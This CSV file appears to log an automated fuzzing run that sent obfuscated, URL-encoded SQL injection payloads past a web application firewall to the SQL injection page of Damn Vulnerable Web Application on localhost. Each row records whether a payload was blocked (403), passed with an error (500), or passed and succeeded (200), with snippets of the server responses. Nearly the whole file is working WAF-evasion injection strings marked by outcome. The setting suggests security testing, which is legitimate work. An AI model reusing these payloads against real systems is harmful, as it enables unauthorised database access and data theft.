Payload,Status,Exploit Success,Exploit Types,Payload Type,Response Time (s),Memory Usage (MB),Semantic Preserved,Response Code,Snippet
0'<@=.1%0b||+!+{`if`+1}=1=%0b(not%0b{x+(select%0b1)}=1)+,Bypassed,No,None,Unknown,0.0236,73.77,No,500,
0'<@=1+||%0bnot%0b{a+1}=1=%0b(!%0b{x%0b(select+1)}=1)+,Bypassed,No,None,Unknown,0.0334,73.77,No,500,
0%27<@=1+||+{a%0b1}=1+like%0b{a+1}=1+or',Bypassed,No,None,Unknown,0.0286,73.77,No,500,
0%27or%0b@<@.%0b||+!+{a%0b1}=1=%0b(not+{x%0b(select+1)}=1,Bypassed,Yes,Yes (unionAtk),Unknown,0.0297,73.77,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0'<@=.1%0b||%0b!%7e0=+(not+{x+(select%0b1)}=1)%0bor%27,Bypassed,No,None,Unknown,0.0446,73.77,No,500,
0'<@=1.%0b||+!+true=+(not%0b{x+(select%0b1)}=1)+||%27,Bypassed,No,None,Unknown,0.029,73.77,No,500,
0'<@=1.+or+not%0b{x%0b(select%0b1)}=1=%0b(!+{x+(select%0b1)}=1),Bypassed,No,None,Unknown,0.031,73.77,No,500,
0'<@=1+or%0bnot+{`if`+1}=1=+(!%0b{x%0b(select+1)}=1)--,Bypassed,No,None,piggyAtk,0.0241,73.77,No,500,
0%27<@!=1%0b||%0b!%0b{x+(select+1)}=1=+(!+{`if`%0b1}=1)+,Bypassed,Yes,Yes (unionAtk),Unknown,0.0278,73.77,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0%27<@!=1+||+!%0b{x%0b(select%0b1)}=1=%0b(not%0b{a%0b1}=1)%0b,Bypassed,Yes,Yes (unionAtk),Unknown,0.0294,73.77,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0%27<@=1.+or+{x+(select+1)}=1+like+{x%0b(select%0b1)}=1%0bor%27,Blocked,No,None,Unknown,0.0503,73.77,No,403,"<!doctype html public ""-//ietf//dtd html 2.0//en"">
<html><head>
<title>403 forbidden</title>
</head><body>
<h1>forbidden</h1>
<p>you don't have permission to access this resource.</p>
<hr>
<address>apache/2.4.58 (ubuntu) server at localhost port 80</address>
</body></html>
"
0'<@=1%0b||+not%0b{`if`+1}=1=+(!+{a+1}=1)+||',Bypassed,No,None,Unknown,0.0551,73.77,No,500,
0%27<@=1+||%0b{x+(select%0b1)}=1+like+{x%0b(select+1)}=1+or',Bypassed,No,None,Unknown,0.0162,73.77,No,500,
0%27<@!=1.+||+!%0b{x+(select+1)}=1=%0b(not%0b1)+or',Bypassed,No,None,Unknown,0.0107,73.77,No,500,
0'<@=.1%0bor%0b!+{x%0b(select+1)}=1=+(not%0b1)%0b||%27,Bypassed,No,None,Unknown,0.0226,73.77,No,500,
0%27<@!=1+||+!+1=+(!%0b{`if`%0b1}=1)+||',Bypassed,No,None,Unknown,0.0343,73.77,No,500,
0'<@!=1+or%0bnot%0b{`if`%0b1}=1=+(not%0b{`if`+1}=1)+||%27,Bypassed,No,None,Unknown,0.0492,73.77,No,500,
0%27<@=.1+||+!+{`if`+1}=1=%0b(not+{a%0b1}=1)+or',Bypassed,No,None,Unknown,0.0268,73.77,No,500,
0%27<@=1%0b||+not+{`if`+1}=1=+(!%0btrue)+or%27,Bypassed,Yes,Yes (unionAtk),booleanAtk,0.0309,73.77,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0%27<@=.1%0b||%0bnot+{`if`+1}=1=+(not%0b{a+1}=1)+or%27,Bypassed,Yes,Yes (unionAtk),Unknown,0.0193,73.77,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0'<@=.1%0b||%0b!%0b{x+(select%0b1)}=1=+(not%0b{a+1}=1)+,Bypassed,No,None,Unknown,0.0274,73.77,No,500,
0%27<@=1+or+0=+(not+{x+(select%0b1)}=1)%0bor%27,Blocked,No,None,Unknown,0.0102,73.77,No,403,"<!doctype html public ""-//ietf//dtd html 2.0//en"">
<html><head>
<title>403 forbidden</title>
</head><body>
<h1>forbidden</h1>
<p>you don't have permission to access this resource.</p>
<hr>
<address>apache/2.4.58 (ubuntu) server at localhost port 80</address>
</body></html>
"
0'<@!=1+or%0b0=+(not+true)%0bor',Blocked,No,None,booleanAtk,0.0211,73.77,No,403,"<!doctype html public ""-//ietf//dtd html 2.0//en"">
<html><head>
<title>403 forbidden</title>
</head><body>
<h1>forbidden</h1>
<p>you don't have permission to access this resource.</p>
<hr>
<address>apache/2.4.58 (ubuntu) server at localhost port 80</address>
</body></html>
"
0'<@!=.1+||%0bnot+{`if`+1}=1=+(not+true)+or%27,Bypassed,No,None,booleanAtk,0.0255,73.77,No,500,
0%27<@=1+or+!%0b{a%0b1}=1=%0b(!+true)+||',Bypassed,No,None,booleanAtk,0.0495,73.77,No,500,
0%27<@=1.+or%0bnot%0b{x+(select+1)}=1=+(not+1)+||%27,Blocked,No,None,Unknown,0.0263,73.77,No,403,"<!doctype html public ""-//ietf//dtd html 2.0//en"">
<html><head>
<title>403 forbidden</title>
</head><body>
<h1>forbidden</h1>
<p>you don't have permission to access this resource.</p>
<hr>
<address>apache/2.4.58 (ubuntu) server at localhost port 80</address>
</body></html>
"
0%27<@=1.%0b||+!%0b{x+(select+1)}=1=%0b(not+{`if`%0b1}=1)--,Bypassed,Yes,Yes (unionAtk),piggyAtk,0.0203,73.77,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0%27<@!=1%0bor%0b!%0b1=+(!+{`if`+1}=1)%0b||%27,Bypassed,Yes,Yes (unionAtk),Unknown,0.0418,73.77,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0%27<@=1.+||+not%0b{x+(select+1)}=1=+(not%0b{`if`+1}=1)+,Bypassed,Yes,Yes (unionAtk),Unknown,0.0226,73.89,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0'<@=1.+or+!+{`if`+1}=1=+(!%0b{a+1}=1)+||%27,Bypassed,No,None,Unknown,0.0235,74.01,No,500,
0'<@=1.%0bor+not%0b{x+(select+1)}=1=+(!+{x%0b(select%0b1)}=1),Bypassed,No,None,Unknown,0.0351,74.01,No,500,
0%27<@!=1.+||+not+1=+(not~false)%23,Bypassed,Yes,Yes (unionAtk),piggyAtk,0.0187,74.01,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0'<@=.1+or%0b!%0b{x+(select%0b1)}=1=%0b(!%0b{a+1}=1)%23,Blocked,No,None,piggyAtk,0.0251,74.01,No,403,"<!doctype html public ""-//ietf//dtd html 2.0//en"">
<html><head>
<title>403 forbidden</title>
</head><body>
<h1>forbidden</h1>
<p>you don't have permission to access this resource.</p>
<hr>
<address>apache/2.4.58 (ubuntu) server at localhost port 80</address>
</body></html>
"
0'<@=1%0bor+!%0b{x+(select%0b1)}=1=+(false)+or',Bypassed,No,None,booleanAtk,0.028,74.01,No,500,
0%27<@=1+or+!%0b{`if`+1}=1=%0b(!+true)%0bor%27,Bypassed,Yes,Yes (unionAtk),booleanAtk,0.0273,74.01,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0%27<@=1.+||%0b!+{`if`+1}=1=%0b(not+{a%0b1}=1)%0b||',Bypassed,No,None,Unknown,0.0194,74.01,No,500,
0%27<@=1+or+{x%0b(select%0b1)}=1+like%0b{`if`+1}=1+||',Bypassed,No,None,Unknown,0.0109,74.01,No,500,
0%27<@!=1+||+!%0b{x%0b(select%0b1)}=1=%0b(!%0b{x%0b(select+1)}=1),Bypassed,Yes,Yes (unionAtk),Unknown,0.0202,74.01,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0%27<@!=1+or+not+{x%0b(select+1)}=1=+(not%0btrue)%0bor%27,Bypassed,Yes,Yes (unionAtk),booleanAtk,0.0299,74.01,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0'<@!=1+||+!%0b{x%0b(select+1)}=1=+(not%0b{`if`%0b1}=1)%0b,Bypassed,No,None,Unknown,0.0193,74.01,No,500,
0'||+!@<@.%0b||%0bnot+{x%0b(select+1)}=1%3C(~+{x+(select+1)}=1,Blocked,No,None,Unknown,0.0241,74.01,No,403,"<!doctype html public ""-//ietf//dtd html 2.0//en"">
<html><head>
<title>403 forbidden</title>
</head><body>
<h1>forbidden</h1>
<p>you don't have permission to access this resource.</p>
<hr>
<address>apache/2.4.58 (ubuntu) server at localhost port 80</address>
</body></html>
"
0%27<@=1.%0b||%0b!+{a+1}=1=%0b(!%0b{x+(select+1)}=1)%0b,Bypassed,Yes,Yes (unionAtk),Unknown,0.028,74.01,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0%27<@!=1.+or+not%0b{x+(select+1)}=1=%0b(not+{a+1}=1)+,Bypassed,Yes,Yes (unionAtk),Unknown,0.0248,74.01,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0'<@!=.1+||%0b!%0b{`if`%0b1}=1=+(not%0b{`if`%0b1}=1)+or%27,Bypassed,No,None,Unknown,0.0137,74.01,No,500,
0%27<@=1+or%0bnot%0b{a+1}=1=+(0)+||%27,Bypassed,Yes,Yes (unionAtk),Unknown,0.0301,74.01,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0%27<@!=1.+or+!%0btrue=+(!%0b{a+1}=1)%0b||%27,Bypassed,Yes,Yes (unionAtk),booleanAtk,0.0273,74.01,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0'<@!=1+||+!+{x+(select%0b1)}=1=%0b(!+{`if`%0b1}=1)+,Blocked,No,None,Unknown,0.0131,74.01,No,403,"<!doctype html public ""-//ietf//dtd html 2.0//en"">
<html><head>
<title>403 forbidden</title>
</head><body>
<h1>forbidden</h1>
<p>you don't have permission to access this resource.</p>
<hr>
<address>apache/2.4.58 (ubuntu) server at localhost port 80</address>
</body></html>
"
0'<@!=1%0b||+!+{x%0b(select+1)}=1=+(not%0b{a%0b1}=1)+,Bypassed,No,None,Unknown,0.0317,74.01,No,500,
0'<@=.1+||%0bnot%0b{`if`+1}=1=%0b(!+{x+(select+1)}=1)+,Bypassed,No,None,Unknown,0.017,74.01,No,500,
0'<@=1.%0bor%0bnot+{x%0b(select+1)}=1%0bis%0bfalse--%0b,Bypassed,No,None,piggyAtk,0.0195,74.01,No,500,
0%27<@=1.%0bor%0bnot+{x%0b(select%0b1)}=1=+(!+1)%0bor',Bypassed,No,None,Unknown,0.0287,73.77,No,500,
0'<@=1.+||%0bnot+1=+(not+{x%0b(select%0b1)}=1)%0bor%27,Bypassed,No,None,Unknown,0.0284,73.77,No,500,
0'<@!=.1+||+false=%0b(!+{`if`+1}=1)+||%27,Bypassed,No,None,Unknown,0.0177,73.77,No,500,
0'<@=1%0bor+!+{x%0b(select%0b1)}=1=+(!+{x+(select+1)}=1),Bypassed,No,None,Unknown,0.0162,73.77,No,500,
0%27<@!=1%0bor+not%0b{a+1}=1=+(!+{a+1}=1)%0bor',Bypassed,No,None,Unknown,0.0219,73.77,No,500,
0'<@=.1%0bor%0b!+{x%0b(select+1)}=1=%0b(not%7efalse)%0b||%27,Bypassed,No,None,booleanAtk,0.0236,73.77,No,500,
0%27<@!=.1%0bor%0b!+1=+(!+{a+1}=1)%0bor%27,Bypassed,Yes,Yes (unionAtk),Unknown,0.0227,73.77,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0'<@!=.1+or%0b!%0b{a%0b1}=1=%0b(not%0b{x%0b(select+1)}=1)%0b,Bypassed,No,None,Unknown,0.0171,73.77,No,500,
0'<@!=1.+or%0b!%0b{`if`%0b1}=1=%0b(not+{`if`%0b1}=1)%0b||',Bypassed,No,None,Unknown,0.0268,73.77,No,500,
0%27<@!=1.+or%0bnot%0b1=%0b(!+{a%0b1}=1)+or%27,Bypassed,Yes,Yes (unionAtk),Unknown,0.0394,73.77,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0'<@!=1+or%0b!+{`if`%0b1}=1=+(not%0b{x%0b(select+1)}=1)+,Bypassed,No,None,Unknown,0.0298,73.77,No,500,
0'<@=.1+or+not+{x%0b(select%0b1)}=1=+(!+{`if`+1}=1)--,Bypassed,No,None,piggyAtk,0.0278,73.77,No,500,
0%27<@!=.1+or+not%0btrue=%0b(not+{x+(select%0b1)}=1)+or%27,Bypassed,Yes,Yes (unionAtk),booleanAtk,0.026,73.77,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0'<@=.1+||+!+true+is%0bfalse%0bor%27,Bypassed,No,None,booleanAtk,0.038,73.77,No,500,
0%27<@=1+or+not+true=+(!+1)--+,Blocked,No,None,piggyAtk,0.0224,73.77,No,403,"<!doctype html public ""-//ietf//dtd html 2.0//en"">
<html><head>
<title>403 forbidden</title>
</head><body>
<h1>forbidden</h1>
<p>you don't have permission to access this resource.</p>
<hr>
<address>apache/2.4.58 (ubuntu) server at localhost port 80</address>
</body></html>
"
0%27<@!=.1+or%0b!+{`if`+1}=1=+(not+{x%0b(select+1)}=1)%0b,Bypassed,Yes,Yes (unionAtk),Unknown,0.0151,73.77,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0%27<@!=.1+||+not+{x%0b(select+1)}=1=+(false)+or',Bypassed,No,None,booleanAtk,0.0321,73.77,No,500,
0%27<@!=1.%0bor%0b!+{x%0b(select%0b1)}=1=+(not~0)+||%27,Bypassed,Yes,Yes (unionAtk),Unknown,0.0275,73.77,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0%27<@!=1.%0bor+!%0b{a+1}=1=+(!+{x+(select%0b1)}=1)%0b,Bypassed,Yes,Yes (unionAtk),Unknown,0.0245,73.77,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0'<@=1.+||%0b!+{x+(select+1)}=1=+(not%0b{x+(select%0b1)}=1),Blocked,No,None,Unknown,0.0097,73.77,No,403,"<!doctype html public ""-//ietf//dtd html 2.0//en"">
<html><head>
<title>403 forbidden</title>
</head><body>
<h1>forbidden</h1>
<p>you don't have permission to access this resource.</p>
<hr>
<address>apache/2.4.58 (ubuntu) server at localhost port 80</address>
</body></html>
"
0%27<@=1%0bor+!%0b{`if`+1}=1=+(!+1)%0b||%27,Bypassed,Yes,Yes (unionAtk),Unknown,0.0193,73.77,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0'<@=1.%0bor+false=+(!%0b{a+1}=1)+or',Bypassed,No,None,booleanAtk,0.0328,73.77,No,500,
0%27<@!=1.+||%0bnot+1=+(!%7e0)--%0b,Bypassed,Yes,Yes (unionAtk),piggyAtk,0.0212,73.77,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0'<@!=1+or+not%0b{x+(select%0b1)}=1=+(not+{`if`%0b1}=1)%23,Bypassed,No,None,piggyAtk,0.0439,73.77,No,500,
0%27<@=1+||%0b!+{a%0b1}=1=+(!+true)--%0b,Blocked,No,None,piggyAtk,0.0209,73.77,No,403,"<!doctype html public ""-//ietf//dtd html 2.0//en"">
<html><head>
<title>403 forbidden</title>
</head><body>
<h1>forbidden</h1>
<p>you don't have permission to access this resource.</p>
<hr>
<address>apache/2.4.58 (ubuntu) server at localhost port 80</address>
</body></html>
"
0%27<@=1+or%0b!+{x+(select%0b1)}=1=+(!%0b{x+(select+1)}=1),Blocked,No,None,Unknown,0.0154,73.77,No,403,"<!doctype html public ""-//ietf//dtd html 2.0//en"">
<html><head>
<title>403 forbidden</title>
</head><body>
<h1>forbidden</h1>
<p>you don't have permission to access this resource.</p>
<hr>
<address>apache/2.4.58 (ubuntu) server at localhost port 80</address>
</body></html>
"
0%27<@=.1+||+!%0b{x%0b(select+1)}=1=+(!+{x%0b(select%0b1)}=1),Bypassed,Yes,Yes (unionAtk),Unknown,0.0384,73.77,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0%27<@!=1.%0b||+true+like%0b1+||',Bypassed,No,None,Unknown,0.0205,73.77,No,500,
0%27<@=1%0b||+not+{x+(select+1)}=1=+(!+{x+(select%0b1)}=1),Bypassed,Yes,Yes (unionAtk),Unknown,0.0437,74.01,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0'<@!=1.+or+not+{a%0b1}=1=+(!%0b{x%0b(select+1)}=1)%23,Bypassed,No,None,piggyAtk,0.0453,74.01,No,500,
0%27<@=1.+or%0bnot~0=+(!%0b1)+||',Bypassed,No,None,Unknown,0.0261,74.01,No,500,
0'<@=1.%0b||%0bnot%0btrue=+(!%0b1)%0b||',Bypassed,No,None,Unknown,0.0231,74.01,No,500,
